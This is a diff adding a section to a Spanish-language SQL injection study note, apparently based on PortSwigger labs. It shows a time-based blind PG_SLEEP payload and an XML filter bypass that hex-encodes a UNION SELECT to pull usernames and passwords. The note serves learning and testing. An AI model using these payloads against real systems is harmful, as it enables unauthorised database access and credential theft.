@@ -428,6 +428,27 @@ X';SELECT CASE WHEN (USERNAME='ADMINISTRATOR') THEN PG_SLEEP(10) ELSE PG_SLEEP(0
 ```
 **NOTA: Para la enumeración ordena el filtrador por el tiempo de respuesta, seleccionalo, cambia de color y filtrar solo los coloreados, despues ordena por payload numerico y copia la columna con CTRL + Clic para copiar toda el parametro**
 
+# SQL injection with filter bypass via XML encoding
+En ocasciones existe el filtrado de las entradas por lo que se debe ofuscar las consultas, además de que las consultas pueden realizarse por otros medios como los archivos xml en lo lgar de un get o post
+## Herramienta Hackvertor
+La herramienta de hackvertor permite codificar texto durante el envio de la información mostrando el texto claro en el input pero enviando los datos ofuscados
+### Ejemplo XML
+```
+Dentro de una aplicación de chequeo de productos por sucursal se envia los datos de las consultas pero se encuentra filtrada por lo que se debe ofuscar
+
+<xml>
+<productId>1</productId>
+<storeId>11</storeId>
+</xml>
+
+<storeId>1+1</storeId> => Primero se valida que esten permitidas las operaciones
+<storeId>1 UNION SELECT NULL</storeId> => Se intenta concatenar pero se identifica que esta filtrada
+
+Con hackvertor se inyecta la consulta
+<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>
+
+Más ofuscaciones https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings
+```
 # Final
 Cheat Sheet
 https://portswigger.net/web-security/sql-injection/cheat-sheet
